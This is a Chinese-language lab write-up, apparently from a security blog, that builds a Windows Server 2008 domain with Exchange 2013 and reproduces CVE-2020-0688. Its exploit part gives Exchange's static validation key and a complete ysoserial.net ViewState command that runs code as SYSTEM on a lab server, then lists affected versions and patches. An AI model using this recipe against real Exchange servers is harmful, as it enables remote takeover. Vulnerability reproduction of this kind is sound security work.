## 环境搭建

使用Windows Server 2008安装Exchange Server 2013

  * 首先要在虚拟机内将Server2008设置为静态IP  
![1598246836.png!small](https://image.3001.net/images/20200824/1598246836.png!small)

  * 在服务器管理器中选择添加角色-勾选域服务  
![1598246850.png!small](https://image.3001.net/images/20200824/1598246850.png!small)

  * 安装完成后，在开始->运行打开dcpromo

![1598246869.png!small](https://image.3001.net/images/20200824/1598246869.png!small)

  * 点击两次下一步后，选择在新林中新建域

![1598246899.png!small](https://image.3001.net/images/20200824/1598246899.png!small)

  * 输入一个域名格式

![1598246912.png!small](https://image.3001.net/images/20200824/1598246912.png!small)

  * 选择win2008，勾选dns

![1598246925.png!small](https://image.3001.net/images/20200824/1598246925.png!small)

  * 设置密码

![1598246936.png!small](https://image.3001.net/images/20200824/1598246936.png!small)![1598246951.png!small](https://image.3001.net/images/20200824/1598246951.png!small)

  * 完成安装

![1598246965.png!small](https://image.3001.net/images/20200824/1598246965.png!small)

## 前期准备

  * 打开ad用户和计算机，选择users添加域用户  
![1598246993.png!small](https://image.3001.net/images/20200824/1598246993.png!small)![1598247011.png!small](https://image.3001.net/images/20200824/1598247011.png!small)

  * 创建完成后更改域  
![1598247023.png!small](https://image.3001.net/images/20200824/1598247023.png!small)![1598247036.png!small](https://image.3001.net/images/20200824/1598247036.png!small)

  * 输入刚刚添加的用户，之后重启计算机  
![1598247095.png!small](https://image.3001.net/images/20200824/1598247095.png!small)

  * 使用刚才添加的用户登录后安装其他必备组件  
管理员启动powershell  
Import-Module ServerManager  
Add-WindowsFeature RSAT-ADDS  
![1598247112.png!small](https://image.3001.net/images/20200824/1598247112.png!small)

  * 安装完成后重启计算机，使用管理员权限打开powershell  
Import-Module ServerManager  
Add-WindowsFeature NET-Framework, ADLDS  
![1598247135.png!small](https://image.3001.net/images/20200824/1598247135.png!small)

  * 安装.Net 4.5

![1598247150.png!small](https://image.3001.net/images/20200824/1598247150.png!small)

  * 安装Microsoft Office 2010 Filter Pack 64 位  
<https://www.microsoft.com/en-us/download/confirmation.aspx?id=17062>

![1598247165.png!small](https://image.3001.net/images/20200824/1598247165.png!small)

  * 打开exchange，选择解压位置

![1598247176.png!small](https://image.3001.net/images/20200824/1598247176.png!small)

  * 开始安装Exchang  
![1598247191.png!small](https://image.3001.net/images/20200824/1598247191.png!small)  
![1598247210.png!small](https://image.3001.net/images/20200824/1598247210.png!small)

  * 安装过程遇到一堆问题，挨个解决。。  
![1598247239.png!small](https://image.3001.net/images/20200824/1598247239.png!small)

  * 开始正式安装  
![image](https://image.3001.net/images/20200824/1598248475.png!small)

安装完成

![1598247257.png!small](https://image.3001.net/images/20200824/1598247257.png!small)

## CVE-2020-0688漏洞复现

  * 漏洞详情  
具体来说，漏洞是在Exchange Control Panel
（ECP）组件中发现的。这个漏洞的性质非常简单。与每次软件安装都会产生随机密钥不同，所有Microsoft Exchange
Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey。这些密钥用于保证ViewState的安全性。而ViewState是ASP.NET
Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。  
![1598247341.png!small](https://image.3001.net/images/20200824/1598247341.png!small)

由于使用了静态密钥，经过身份验证的攻击者可以欺骗目标服务器反序列化恶意创建的ViewState数据。在[YSoSerial.net](https://github.com/pwntester/ysoserial.net)的帮助下，攻击者可以在Exchange
Control Panel web应用上执行任意.net代码。

  * 为了利用这个漏洞，我们需要从经过身份验证的session中收集ViewStateUserKey和__VIEWSTATEGENERATOR值。ViewStateUserKey可以从ASP.NET的_SessionIDcookie中获取，而ViewStateUserKey可以在一个隐藏字段中找到。所有这些都可以通过浏览器中的工具轻松找到。  
首先，进入192.168.92.128/ecp页面并登录。所使用的帐户不需要任何高权限  
![1598247366.png!small](https://image.3001.net/images/20200824/1598247366.png!small)

  * 接下来，打开浏览器开发工具的Network选项，然后按F5重新发送请求。在页面源代码中可以找到 __VIEWSTATEGENERATOR，它的值是B97B4E27  
![1598247389.png!small](https://image.3001.net/images/20200824/1598247389.png!small)  
然后，打开Headers选项卡并找到ASP.NET_SessionId=40c8e078-dc79-4001-9a52-de175b38a028  
![1598247430.png!small](https://image.3001.net/images/20200824/1598247430.png!small)

  * 现在获得了攻击所需要的全部信息：  
\--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF  
\--validationalg = SHA1  
\--generator = B97B4E27  
\--viewstateuserkey = c1187666-c0ae-4f61-95d4-d2f5348d4300

  * 下一步是使用ysoserial.net生成ViewState的paylaod。通过创建文件C:\TideSec.txt来演示远程代码执行：  
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c echo test
> C:\TideSec.txt" --validationalg="SHA1"
--validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"
--generator="B97B4E27"
--viewstateuserkey="c1187666-c0ae-4f61-95d4-d2f5348d4300" --isdebug --islegacy  
![1598247448.png!small](https://image.3001.net/images/20200824/1598247448.png!small)

  * 将输出结果进行URL编码并构造如下URL：  
<https://192.168.92.128/ecp/default.aspx>? **VIEWSTATEGENERATOR= &**VIEWSTATE=  
![1598247463.png!small](https://image.3001.net/images/20200824/1598247463.png!small)

![1598247481.png!small](https://image.3001.net/images/20200824/1598247481.png!small)

浏览器内提交地址进行访问，回显500错误，但实际已经创建成功，并且可以看到是具有SYSTEM”权限的进程创建的。这表明攻击者可以以“SYSTEM”身份远程执行代码，完全破坏Exchange服务器。

![1598247495.png!small](https://image.3001.net/images/20200824/1598247495.png!small)

![1598247507.png!small](https://image.3001.net/images/20200824/1598247507.png!small)

## 影响范围及加固

  * 影响版本  
影响所有版本的Exchang Server：  
Microsoft Exchange Server 2010 Service Pack 3  
Microsoft Exchange Server 2013  
Microsoft Exchange Server 2016  
Microsoft Exchange Server 2019

  * 防护措施  
补丁下载  
Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 [KB4536989](wp-admin/post.php?id=100910%20Microsoft%20Exchange%20Server%202013%20Cumulative%20Update%2023%20KB4536988%20https://www.microsoft.com/zh-CN/download/details.aspx?id=100909%20Microsoft%20Exchange%20Server%202016%20Cumulative%20Update%2014%20KB4536987%20https://www.microsoft.com/zh-CN/download/details.aspx?id=100907%20Microsoft%20Exchange%20Server%202016%20Cumulative%20Update%2015%20KB4536987%20https://www.microsoft.com/zh-CN/download/details.aspx?id=100908%20Microsoft%20Exchange%20Server%202019%20Cumulative%20Update%203%20KB4536987%20https://www.microsoft.com/en-us/download/details.aspx?id=100905%20Microsoft%20Exchange%20Server%202019%20Cumulative%20Update%204%20KB4536987%20https://www.microsoft.com/zh-CN/download/details.aspx?id=100906)  
Microsoft Exchange Server 2013 Cumulative Update 23
[KB4536988](https://www.microsoft.com/zh-CN/download/details.aspx?id=100909)  
Microsoft Exchange Server 2016 Cumulative Update 14
[KB4536987](https://www.microsoft.com/zh-CN/download/details.aspx?id=100907)  
Microsoft Exchange Server 2016 Cumulative Update 15
[KB4536987](https://www.microsoft.com/zh-CN/download/details.aspx?id=100908)  
Microsoft Exchange Server 2019 Cumulative Update 3
[KB4536987](https://www.microsoft.com/en-us/download/details.aspx?id=100905)  
Microsoft Exchange Server 2019 Cumulative Update 4
[KB4536987](https://www.microsoft.com/zh-CN/download/details.aspx?id=100906)

## 参考链接

<https://nosec.org/home/detail/4158.html>

<https://blog.csdn.net/u011189710/article/details/81150026>

<https://xz.aliyun.com/t/7299>

